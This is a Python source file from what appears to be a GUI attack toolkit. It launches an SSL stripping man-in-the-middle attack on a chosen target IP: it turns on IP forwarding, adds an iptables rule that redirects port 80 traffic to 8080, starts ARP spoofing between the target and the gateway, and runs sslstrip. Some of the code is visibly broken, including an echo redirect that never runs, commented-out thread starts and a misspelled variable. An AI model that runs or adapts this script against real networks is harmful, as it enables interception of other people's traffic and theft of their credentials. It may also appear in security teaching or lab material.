import threading
import traceback
import subprocess
import time
import signal
import re
from Layer2Attacks.PageArpAttacks.funcFrameArp import *

from tkinter import *

def startSslStrip(targetIp, defaultGatewayIp, terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
    global sslStripIsRunning, sslStripThreads, terminalLabel, wiresharkLabel, errorOutputLabel

    sslStripIsRunning = False
    sslStripThreads = threading.Thread(target = lambda : sslStripHub(targetIp, defaultGatewayIp, terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#1A3329", font="bahnschrift 8", justify = "left", wraplength=480)
    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#1A3329", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#1A3329", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    wiresharkLabel.configure(bg = colorConfig)
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Running SSL Strip Attack...\n\n"

    runSslStrip()

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopSslStrip() :
    global sslStripThreads, sslStripIsRunning, runArpSpoofThread, runSslStripThread

    try:
        terminalLabel["text"] += "\n$ Stopping SSL Strip Attack...\n\n"
        sslStripIsrunning = False
        sslStripThreads.join(0)
        sslStripThreads = None

        process.send_signal(signal.SIGINT)
        process.wait()
        runArpSpoofThread.join(0)
        runSslStripThread.join(0)

        runArpSpoofThread = None
        runSslStripThread = None

        terminalLabel["text"] += "$ SSL Strip Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"

def runSslStrip() :
    global sslStripThreads, sslStripIsRunning
    sslStripIsRunning = True
    sslStripThreads.start()

def sslStripHub(targetIp, defaultGatewayIp, terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame):
    global runArpSpoofThread, runSslStripThread
    
    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"])

    runArpSpoofThread = threading.Thread(target = lambda : startArp(targetIp, defaultGatewayIp, terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame))
    runSslStripThread = threading.Thread(target = lambda : beginSslStrip())

    #runArpSpoofThread.start()
    #runSslStripThread.start()

def beginSslStrip() :
    global process

    process = subprocess.Popen(["sslstrip", "-l", "8080"])